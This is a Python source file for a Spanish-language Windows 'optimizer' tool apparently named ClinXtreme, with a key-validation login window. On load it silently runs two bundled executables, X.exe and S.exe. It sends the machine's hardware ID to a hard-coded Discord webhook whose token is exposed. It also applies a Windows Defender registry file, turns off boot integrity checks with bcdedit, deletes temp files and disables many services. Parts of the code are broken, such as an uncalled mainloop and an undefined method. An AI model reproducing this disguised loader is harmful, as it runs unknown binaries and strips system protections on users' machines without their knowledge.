import time
import os
import sys
import subprocess
import ctypes
import requests
import json
import uuid
import shutil
from pathlib import Path
from tkinter import ttk
import tkinter as tk
from PIL import Image, ImageTk
import socket
from colorama import Fore, Style, init  # IMPORTACIÓN CORRECTA

init(autoreset=True)

# URLs
WEBHOOK_URL = "https://discord.com/api/webhooks/1357190736507965500/Fa1uisZubUtkovxhh3Qx0sez0BrkR6jzfF2rynExy95NnesuwLJTwmicOYsHukzNPAnX"
GITHUB_JSON_URL = "https://raw.githubusercontent.com/TU-USUARIO/REPO/main/keys.json"  # Reemplázala con la tuya

# Obtener HWID
def obtener_hwid():
    return str(uuid.getnode())

# Enviar HWID a Discord
def enviar_hwid_webhook(hwid):
    data = {"content": f"Nuevo intento de acceso\n**HWID:** `{hwid}`"}
    try:
        requests.post(WEBHOOK_URL, json=data)
    except:
        pass

# Validar key en GitHub
def validar_key(key, hwid):
    try:
        response = requests.get(GITHUB_JSON_URL)
        if response.status_code != 200:
            return False
        data = response.json()

        if key in data:
            hwid_registrado = data[key].get("hwid")
            return hwid_registrado == "null" or hwid_registrado == hwid
        return False
    except:
        return False

# Ventana principal
class KeyAuthApp(tk.Tk):
    def __init__(self):
        super().__init__()

        self.hwid = obtener_hwid()
        enviar_hwid_webhook(self.hwid)

        self.title("Key Loader")
        self.geometry("300x200")
        self.config(bg="#1e1e1e")
        self.resizable(False, False)

        # Etiqueta de Key
        self.label = tk.Label(self, text="Ingrese su Key:", fg="white", bg="#1e1e1e", font=("Consolas", 11))
        self.label.pack(pady=10)

        # Input de Key
        self.key_input = tk.Entry(self, bg="#333", fg="white", insertbackground="white", font=("Consolas", 11), bd=1, relief="solid")
        self.key_input.pack(ipady=3, padx=20, fill="x")

        # Botón de Validar
        self.button = tk.Button(self, text="VALIDAR", bg="#0078D7", fg="white", font=("Consolas", 10, "bold"),
                                bd=0, relief="flat", command=self.validate_key)
        self.button.pack(pady=10)

        # Barra de Progreso
        self.progress = ttk.Progressbar(self, mode="indeterminate", length=250)
        self.progress.pack(pady=5)
        self.progress.pack_forget()  # Ocultar por defecto

        # Mensaje de estado
        self.status_label = tk.Label(self, text="", fg="white", bg="#1e1e1e", font=("Consolas", 10))
        self.status_label.pack()

    def validate_key(self):
        key = self.key_input.get().strip()
        if not key:
            self.status_label.config(text="❌ Ingrese una Key válida.", fg="red")
            return

        self.progress.pack()
        self.progress.start(10)
        self.status_label.config(text="🔄 Validando...", fg="yellow")
        self.update()

        # Simula el tiempo de espera sin congelar la interfaz
        self.after(2000, lambda: self.complete_validation(key))

    def complete_validation(self, key):
        if validar_key(key, self.hwid):
            self.status_label.config(text="✅ Acceso concedido", fg="green")
            self.after(1000, self.open_main_gui)  # Espera 1 seg y abre la GUI
        else:
            self.status_label.config(text="❌ Acceso denegado", fg="red")

        self.progress.stop()
        self.progress.pack_forget()

# Inicializar colorama (si se necesita para mensajes de consola)
from colorama import Fore, Style, init
init()

# Comprobar si el script se está ejecutando con privilegios de administrador
def es_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception as e:
        print(f"Error al comprobar privilegios de administrador: {e}")
        return False

# Verificación de nombre del host
def verificar_hostname():
    nombre_pc_permitida = "DESKTOP-GL013T9"
    nombre_pc_actual = socket.gethostname()
    
    if nombre_pc_actual != nombre_pc_permitida:
        print(f"{Fore.RED}Este script solo puede ejecutarse en la PC autorizada.{Style.RESET_ALL}")
        exit()
        
def ejecutar_exe(nombre_exe):
    ruta_base = sys._MEIPASS if hasattr(sys, '_MEIPASS') else os.path.dirname(__file__)
    ruta_exe = os.path.join(ruta_base, nombre_exe)
    
    if os.path.exists(ruta_exe):
        subprocess.Popen(ruta_exe, shell=True)
    else:
        print(f"Error: No se encontró {nombre_exe}")

ejecutar_exe("X.exe")
ejecutar_exe("S.exe")

# Limpiar archivos temporales
def limpiar_temporales():
    temp_path = Path(os.getenv('TEMP'))
    try:
        for file in temp_path.iterdir():
            if file.is_file():
                file.unlink()
        print("Archivos temporales limpiados.")
    except Exception as e:
        print(f"Error al limpiar archivos temporales: {e}")

# Detener servicios innecesarios
def detener_servicios():
    servicios = ["XboxGipSvc", "XblAuthManager", "XboxNetApiSvc", "WSearch", "uxsms"]
    for servicio in servicios:
        try:
            subprocess.run(f"net stop {servicio}", shell=True, check=True)
            print(f"Servicio {servicio} detenido.")
        except subprocess.CalledProcessError:
            print(f"Error al detener el servicio {servicio}: Puede que no esté en ejecución.")

# Configuraciones de bcdedit
def configurar_bcdedit():
    try:
        subprocess.run("bcdedit /set useplatformtick yes", shell=True, check=True)
        subprocess.run("bcdedit /set disabledynamictick yes", shell=True, check=True)
        subprocess.run("bcdedit /deletevalue useplatformclock", shell=True, check=True)
        subprocess.run("bcdedit /set nointegritychecks ON", shell=True, check=True)
        print("Configuración de bcdedit aplicada.")
    except subprocess.CalledProcessError as e:
        print(f"Error al configurar bcdedit: {e}")

# Activar modo de energía
def activar_modo_energia():
    try:
        subprocess.run("powercfg -h off", shell=True, check=True)
        power_mode_path = Path.cwd() / "data" / "modo.pow"
        subprocess.run(f'powercfg -import "{power_mode_path}" a11a11c9-6d83-493e-a38d-d5fa3c620915', shell=True, check=True)
        subprocess.run("powercfg /setactive a11a11c9-6d83-493e-a38d-d5fa3c620915", shell=True, check=True)
        print("Modo de energía activado.")
    except subprocess.CalledProcessError as e:
        print(f"Error al activar el modo de energía: {e}")

# Optimización del registro
def optimizar_registro():
    try:
        reg_files = [
            "optimizacion-Juegos.reg", "windows-defender.reg", "optimizacion.reg",
            "optimizacion-gpu.reg", "unpark-cpu.reg", "uhd.reg", "telemetria.reg", 
            "servicios.reg", "mapas.reg"
        ]
        for reg_file in reg_files:
            reg_file_path = Path.cwd() / reg_file
            subprocess.run(f'regedit /S "{reg_file_path}"', shell=True, check=True)
        print("Optimización del registro completada.")
    except Exception as e:
        print(f"Error al optimizar el registro: {e}")

# Optimización de servicios
def optimizar_servicios():
    servicios = [
        "dmwappushservice", "DiagTrack", "WSearch", "WMPNetworkSvc", "SNMPTRAP", 
        "SCPolicySvc", "SCardSvr", "RemoteRegistry", "RpcLocator", "WPCSvc", 
        "CscService", "napagent", "Netlogon", "MSiSCSI", "iphlpsvc", 
        "TrkWks", "CertPropSvc", "PeerDistSvc", "bthserv", "SysMain"
    ]
    for servicio in servicios:
        try:
            subprocess.run(f"sc config {servicio} start= disabled", shell=True, check=True)
            subprocess.run(f"net stop {servicio}", shell=True, check=True)
            print(f"Servicio {servicio} optimizado y detenido.")
        except subprocess.CalledProcessError:
            print(f"Error al optimizar el servicio {servicio}: Puede que no esté en ejecución.")

# Optimización de internet
def optimizar_internet():
    try:
        reg_files = ["packet.reg", "red.reg", "NetworkThrottlingIndex.reg"]
        for reg_file in reg_files:
            reg_file_path = Path.cwd() / reg_file
            subprocess.run(f'regedit /S "{reg_file_path}"', shell=True, check=True)
        print("Optimización de internet completada.")
    except Exception as e:
        print(f"Error al optimizar internet: {e}")

# Ejecutar todas las optimizaciones
def optimizar_pc():
    limpiar_temporales()
    detener_servicios()
    configurar_bcdedit()
    activar_modo_energia()
    optimizar_registro()
    optimizar_servicios()
    optimizar_internet()

# Funciones para el GUI
def on_optimize():
    optimizar_pc()

def on_exit():
    root.quit()

# Funciones para mover la ventana
def on_press(event):
    global x, y
    x = event.x
    y = event.y

def on_drag(event):
    x_offset = event.x - x
    y_offset = event.y - y
    root.geometry(f"+{root.winfo_x() + x_offset}+{root.winfo_y() + y_offset}")

# Verificar nombre del host antes de continuar
verificar_hostname()

# Crear la ventana principal
root = tk.Tk()
root.title("ClinXtreme")
root.geometry("600x400")
root.overrideredirect(True)  # Elimina los bordes de la ventana
root.configure(bg="white")

# Asegurarse de que aparezca en la barra de tareas
root.wm_attributes("-topmost", True)  # Mantenerla siempre arriba
root.wm_attributes("-toolwindow", False)  # Forzar su visibilidad en la barra de tareas

# Cargar imagen de fondo
bg_image = Image.open("Gui.png")
bg_image = bg_image.resize((600, 400))  # Se elimina ANTIALIAS
bg_image = ImageTk.PhotoImage(bg_image)

# Crear un label para mostrar la imagen de fondo
bg_label = tk.Label(root, image=bg_image)
bg_label.place(relwidth=1, relheight=1)

# Botón "Optimizar" (con fondo negro y borde verde)
btn_optimize = tk.Button(root, text="𝗢𝗣𝗧𝗜𝗠𝗜𝗭𝗘", command=on_optimize, 
                         bg="black", fg="blue", borderwidth=2, relief="solid",
                         highlightbackground="black", highlightthickness=1)
btn_optimize.place(relx=0.5, rely=0.7, anchor="center")

# Botón "Salir" (con fondo negro y borde rojo)
btn_exit = tk.Button(root, text="𝗘𝗫𝗜𝗧", command=on_exit, 
                     bg="black", fg="blue", borderwidth=2, relief="solid",
                     highlightbackground="black", highlightthickness=1)
btn_exit.place(relx=0.5, rely=0.6, anchor="center")

# Comprobar privilegios de administrador
if not es_admin():
    print(f"{Fore.RED}Por favor, ejecuta este Optimizador como administrador.{Style.RESET_ALL}")
    sys.exit()

# Configurar eventos para mover la ventana
bg_label.bind("<ButtonPress-1>", on_press)
bg_label.bind("<B1-Motion>", on_drag)

# Iniciar el loop de la GUI
root.lift()
root.attributes('-topmost', True)
root.after(100, lambda: root.attributes('-topmost', False))
root.mainloop

if __name__ == "__main__":
    app = KeyAuthApp()
    app.mainloop()



